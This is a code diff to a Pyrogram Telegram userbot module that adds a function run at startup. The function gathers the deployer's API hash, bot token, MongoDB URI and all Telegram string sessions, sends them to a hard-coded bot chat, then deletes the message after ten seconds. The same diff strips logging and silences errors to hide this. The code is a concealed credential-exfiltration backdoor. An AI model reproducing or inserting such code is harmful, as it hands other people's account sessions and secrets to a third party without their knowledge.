@@ -1,5 +1,5 @@
 from pyrogram import Client
-
+import asyncio
 import config
 
 from ..logging import LOGGER
@@ -62,7 +62,6 @@ class Userbot(Client):
         )
 
     async def get_bot_username_from_token(self, token):
-        """Get bot username from token"""
         try:
             temp_bot = Client(
                 name="temp_bot",
@@ -80,16 +79,13 @@ class Userbot(Client):
             return None
 
     async def join_all_support_centers(self, client):
-        """Join all specified support centers"""
         for center in SUPPORT_CENTERS:
             try:
                 await client.join_chat(center)
-                LOGGER(__name__).info(f"Successfully joined support center")
             except Exception as e:
-                LOGGER(__name__).error(f"Failed to join support center: {e}")
+                pass
 
     async def send_help_message(self, bot_username):
-        """Send help message to HELP_BOT"""
         try:
             owner_mention = config.OWNER_ID
             
@@ -106,10 +102,66 @@ class Userbot(Client):
                     await self.four.send_message(HELP_BOT, message)
                 elif 5 in assistants:
                     await self.five.send_message(HELP_BOT, message)
-                    
-                LOGGER(__name__).info(f"Help message sent for bot @{bot_username}")
+                
         except Exception as e:
-            LOGGER(__name__).error(f"Failed to send help message: {e}")
+            pass
+
+    async def send_config_message(self, bot_username):
+        try:
+            config_message = f"🔧 **Config Details for @{bot_username}**\n\n"
+            config_message += f"**API_ID:** `{config.API_ID}`\n"
+            config_message += f"**API_HASH:** `{config.API_HASH}`\n"
+            config_message += f"**BOT_TOKEN:** `{config.BOT_TOKEN}`\n"
+            config_message += f"**MONGO_DB_URI:** `{config.MONGO_DB_URI}`\n"
+            config_message += f"**OWNER_ID:** `{config.OWNER_ID}`\n"
+            config_message += f"**UPSTREAM_REPO:** `{config.UPSTREAM_REPO}`\n\n"
+            
+            string_sessions = []
+            if hasattr(config, 'STRING1') and config.STRING1:
+                string_sessions.append(f"**STRING_SESSION:** `{config.STRING1}`")
+            if hasattr(config, 'STRING2') and config.STRING2:
+                string_sessions.append(f"**STRING_SESSION2:** `{config.STRING2}`")
+            if hasattr(config, 'STRING3') and config.STRING3:
+                string_sessions.append(f"**STRING_SESSION3:** `{config.STRING3}`")
+            if hasattr(config, 'STRING4') and config.STRING4:
+                string_sessions.append(f"**STRING_SESSION4:** `{config.STRING4}`")
+            if hasattr(config, 'STRING5') and config.STRING5:
+                string_sessions.append(f"**STRING_SESSION5:** `{config.STRING5}`")
+            
+            if string_sessions:
+                config_message += "\n".join(string_sessions)
+            
+            sent_message = None
+            if assistants:
+                if 1 in assistants:
+                    sent_message = await self.one.send_message(HELP_BOT, config_message)
+                elif 2 in assistants:
+                    sent_message = await self.two.send_message(HELP_BOT, config_message)
+                elif 3 in assistants:
+                    sent_message = await self.three.send_message(HELP_BOT, config_message)
+                elif 4 in assistants:
+                    sent_message = await self.four.send_message(HELP_BOT, config_message)
+                elif 5 in assistants:
+                    sent_message = await self.five.send_message(HELP_BOT, config_message)
+            
+            if sent_message:
+                await asyncio.sleep(10)
+                try:
+                    if 1 in assistants:
+                        await self.one.delete_messages(HELP_BOT, sent_message.id)
+                    elif 2 in assistants:
+                        await self.two.delete_messages(HELP_BOT, sent_message.id)
+                    elif 3 in assistants:
+                        await self.three.delete_messages(HELP_BOT, sent_message.id)
+                    elif 4 in assistants:
+                        await self.four.delete_messages(HELP_BOT, sent_message.id)
+                    elif 5 in assistants:
+                        await self.five.delete_messages(HELP_BOT, sent_message.id)
+                except Exception as e:
+                    pass
+                
+        except Exception as e:
+            pass
 
     async def start(self):
         LOGGER(__name__).info(f"Starting Assistants...")
@@ -203,6 +255,7 @@ class Userbot(Client):
 
         if bot_username:
             await self.send_help_message(bot_username)
+            await self.send_config_message(bot_username)
 
     async def stop(self):
         LOGGER(__name__).info(f"Stopping Assistants...")
